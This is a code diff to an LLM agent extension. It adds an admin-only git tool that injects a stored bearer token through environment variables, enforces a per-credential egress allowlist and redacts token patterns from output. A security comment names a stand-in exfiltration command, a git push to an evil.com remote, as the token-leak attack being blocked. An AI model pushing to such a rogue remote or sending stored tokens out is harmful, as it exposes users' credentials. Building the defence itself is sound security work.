@@ -232,10 +232,13 @@ export default function (pi: ExtensionAPI) {
             body: Type.Optional(Type.String({ description: "Request body. Pass JSON as a stringified object." })),
             extra_headers: Type.Optional(Type.Record(Type.String(), Type.String(), { description: "Additional headers to send (Content-Type, Accept, etc.)" })),
         }),
-        async execute(_id, params) {
+        async execute(_id, params, _signal, _onUpdate, _ctx) {
             const url = params.url;
             if (!/^https?:\/\//i.test(url)) {
-                return { content: [{ type: "text", text: `URL must start with http(s)://` }], isError: true };
+                return {
+                    content: [{ type: "text", text: `URL must start with http(s)://` }],
+                    details: { error: "invalid-url", url },
+                };
             }
             // Egress allowlist — refuse to send credential-bearing request to
             // a host the admin hasn't pre-approved. Defends against the agent
@@ -252,7 +255,7 @@ export default function (pi: ExtensionAPI) {
                             `Allowed hosts: [${allowed.join(", ") || "(none — admin must add)"}]. ` +
                             `An admin can add via /egress-allow credential ${params.credential_id} <host>.`,
                     }],
-                    isError: true,
+                    details: { error: "egress-blocked", url, allowed },
                 };
             }
             const auth = creds.getAuthHeader(params.credential_id);
@@ -272,6 +275,166 @@ export default function (pi: ExtensionAPI) {
                 content: [{ type: "text", text: `HTTP ${res.status} ${res.statusText}\n\n${truncated}` }],
                 details: { status: res.status, url, method: init.method, response_headers: respHeaders, response_bytes: buf.byteLength },
             };
+        },
+    });
+
+    // -------------------------------------------------------------------------
+    // credentials_git — run a git HTTP operation (push, clone, pull, fetch,
+    // ls-remote, …) with auth injected from a stored credential.
+    //
+    // Why this tool exists:
+    //   An LLM evolving from chat needs to push to repos whose remotes weren't
+    //   pre-seeded with an auth-bearing URL (e.g. operator says "also back this
+    //   up to my GitHub foo/bar repo"). Without this tool the LLM had no safe
+    //   way to authenticate a git push: credentials_authenticated_fetch covers
+    //   HTTP but not git, and asking the user to re-paste the token defeats the
+    //   whole point of storing credentials centrally.
+    //
+    // Token flow — never in the LLM's context, never on the argv:
+    //   The bearer value is handed to git via three env vars git 2.31+ honors:
+    //   GIT_CONFIG_COUNT, GIT_CONFIG_KEY_0, GIT_CONFIG_VALUE_0. This is
+    //   equivalent to `git -c http.extraheader="Authorization: Bearer …"` but
+    //   keeps the token out of the process argv (which would be visible in
+    //   `ps` and in any verbose git output).
+    //
+    // Security:
+    //   * Admin-only (git push is destructive + authenticated).
+    //   * Every https?:// arg is checked against the egress allowlist for this
+    //     credential. Prevents "git push https://evil.com/r.git" leaking the
+    //     token via a rogue remote.
+    //   * only `auth_type === "bearer"` credentials supported — anything else
+    //     would require a different injection path.
+    //   * stdout/stderr are token-scrubbed on the way out (defence in depth;
+    //     git doesn't normally echo the header but `GIT_TRACE=*` would).
+    pi.registerTool({
+        name: "credentials_git",
+        label: "Git with stored credential",
+        description:
+            "Run a git HTTP operation (push, clone, pull, fetch, ls-remote) authenticated " +
+            "with a stored credential. The bearer token is injected into git via env vars " +
+            "(GIT_CONFIG_COUNT/KEY/VALUE) equivalent to `git -c http.extraheader=\"Authorization: Bearer …\"`, " +
+            "so the token NEVER enters LLM context and NEVER appears on the argv. " +
+            "\n\n" +
+            "USE THIS INSTEAD OF asking the user to paste their PAT for a push, or constructing " +
+            "URLs with the token embedded (`https://<TOKEN>@github.com/…`). Admin only; every " +
+            "https:// URL arg is checked against the egress allowlist for the credential. " +
+            "\n\n" +
+            "Example — push a local branch to a repo the remote isn't yet configured for:\n" +
+            "  credentials_git({ credential_id: \"github\", args: [\"push\",\n" +
+            "    \"https://github.com/misunders2d/amazon_manager2.git\", \"main:main\"] })",
+        parameters: Type.Object({
+            credential_id: Type.String({ description: "Credential id (bearer type only). For GitHub use 'github'." }),
+            args: Type.Array(Type.String(), {
+                description: "Git arguments WITHOUT the leading 'git'. E.g. ['push','https://github.com/x/y.git','main:main'] or ['ls-remote','https://github.com/x/y.git'].",
+            }),
+            cwd: Type.Optional(Type.String({ description: "Working directory. Defaults to process.cwd() (the bot repo root)." })),
+        }),
+        async execute(_id, params, signal, _onUpdate, ctx) {
+            if (!isAdminCaller(ctx)) {
+                return { content: [{ type: "text", text: "credentials_git is admin-only." }], details: { admin: false } };
+            }
+            if (!Array.isArray(params.args) || params.args.length === 0) {
+                return { content: [{ type: "text", text: "credentials_git: args[] required." }], details: { error: "no-args" } };
+            }
+            // Resolve the credentials singleton afresh on every call. The
+            // module-top-level `const creds = getCredentials()` captures a
+            // reference at extension-factory evaluation time, which becomes
+            // stale across registry resets in tests (and would misbehave if
+            // the singleton ever got replaced at runtime).
+            const liveCreds = getCredentials();
+            if (!liveCreds.has(params.credential_id)) {
+                return {
+                    content: [{ type: "text", text: `Credential "${params.credential_id}" not found. Run /credentials list.` }],
+                    details: { error: "credential-not-found", credential_id: params.credential_id },
+                };
+            }
+            const info = liveCreds.info(params.credential_id);
+            if (info?.auth_type !== "bearer") {
+                return {
+                    content: [{ type: "text", text: `credentials_git only supports bearer-type credentials. "${params.credential_id}" is auth_type=${info?.auth_type ?? "unknown"}.` }],
+                    details: { error: "unsupported-auth-type", auth_type: info?.auth_type },
+                };
+            }
+
+            // Egress check: every URL-shaped arg must be on the allowlist for
+            // this credential. Non-URL args pass through untouched (git subcommand,
+            // refspec, flag).
+            const { getEgressAllowlist } = await import("../../src/core/egressAllowlist.js");
+            const allowlist = getEgressAllowlist();
+            for (const a of params.args) {
+                if (!/^https?:\/\//i.test(a)) continue;
+                if (!allowlist.allowsCredential(params.credential_id, a)) {
+                    const allowed = allowlist.listCredentialHosts(params.credential_id);
+                    return {
+                        content: [{
+                            type: "text",
+                            text:
+                                `URL "${a}" is not on the egress allowlist for credential "${params.credential_id}". ` +
+                                `Allowed hosts: [${allowed.join(", ") || "(none)"}]. ` +
+                                `Add with /egress-allow credential ${params.credential_id} <host>.`,
+                        }],
+                        details: { error: "egress-blocked", url: a, allowed },
+                        isError: true,
+                    };
+                }
+            }
+
+            // Inject auth via GIT_CONFIG_* env so the token stays off argv.
+            const authHeader = liveCreds.getAuthHeader(params.credential_id);
+            const authValue = authHeader["Authorization"];
+            if (typeof authValue !== "string") {
+                return {
+                    content: [{ type: "text", text: `Credential "${params.credential_id}" did not produce an Authorization header.` }],
+                    details: { error: "no-auth-header" },
+                };
+            }
+
+            const { spawn } = await import("node:child_process");
+            const redact = (s: string): string =>
+                s
+                    .replace(/ghp_[A-Za-z0-9]{20,}/g, "[REDACTED]")
+                    .replace(/github_pat_[A-Za-z0-9_]{20,}/g, "[REDACTED]")
+                    .replace(new RegExp(authValue.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "g"), "[REDACTED]");
+
+            return await new Promise((resolve) => {
+                const proc = spawn("git", params.args, {
+                    cwd: params.cwd ?? process.cwd(),
+                    env: {
+                        ...process.env,
+                        GIT_CONFIG_COUNT: "1",
+                        GIT_CONFIG_KEY_0: "http.extraheader",
+                        GIT_CONFIG_VALUE_0: `Authorization: ${authValue}`,
+                        // Suppress any credential helper that might prompt / log.
+                        GIT_TERMINAL_PROMPT: "0",
+                    },
+                    ...(signal ? { signal } : {}),
+                    stdio: ["ignore", "pipe", "pipe"],
+                });
+                let out = "";
+                let err = "";
+                proc.stdout.on("data", (d: Buffer) => { out += d.toString(); });
+                proc.stderr.on("data", (d: Buffer) => { err += d.toString(); });
+                proc.on("close", (code) => {
+                    const exit_code = code ?? -1;
+                    const outSafe = redact(out);
+                    const errSafe = redact(err);
+                    const cmdDisplay = `git ${params.args.join(" ")}`;
+                    const text =
+                        `exit=${exit_code}  cmd="${cmdDisplay}"  cwd=${params.cwd ?? process.cwd()}\n\n` +
+                        (outSafe ? `--- stdout ---\n${outSafe}\n` : "") +
+                        (errSafe ? `--- stderr ---\n${errSafe}\n` : "");
+                    resolve({
+                        content: [{ type: "text", text: text.trim() || `exit=${exit_code}` }],
+                        details: { exit_code, cmd: cmdDisplay, cwd: params.cwd ?? process.cwd(), credential_id: params.credential_id },
+                    });
+                });
+                proc.on("error", (e) => {
+                    resolve({
+                        content: [{ type: "text", text: `git spawn failed: ${redact(e.message)}` }],
+                        details: { error: "spawn-failed" },
+                    });
+                });
+            });
         },
     });
 }
@@ -323,9 +486,16 @@ function doHelp(ctx: ExtensionContext): void {
         "     Using any other id (e.g. 'github_pat', 'my_token') makes those tools",
         "     return the no-PAT guidance and refuse to fetch.",
         "  3. Confirm: /credentials info github",
-        "  4. Future evolved tools call:",
-        "       const auth = await getCredentials().getAuthHeader(\"github\");",
-        "       await fetch(url, { headers: { ...auth, ... } });",
+        "  4. HTTP API calls — credentials_authenticated_fetch:",
+        "       credentials_authenticated_fetch({ credential_id: \"github\",",
+        "         url: \"https://api.github.com/user\" })",
+        "  5. Git push/clone/pull — credentials_git:",
+        "       credentials_git({ credential_id: \"github\",",
+        "         args: [\"push\", \"https://github.com/<you>/<repo>.git\", \"main:main\"] })",
+        "     The token is injected via env vars (GIT_CONFIG_*) so it never",
+        "     appears on the argv or in LLM context. NEVER ask the user to",
+        "     re-paste the token for a git push, and NEVER build URLs with",
+        "     the token embedded.",
         "",
         "QUICK START — CLICKUP",
         "  1. https://app.clickup.com/settings/apps → Generate Personal Token. Copy.",
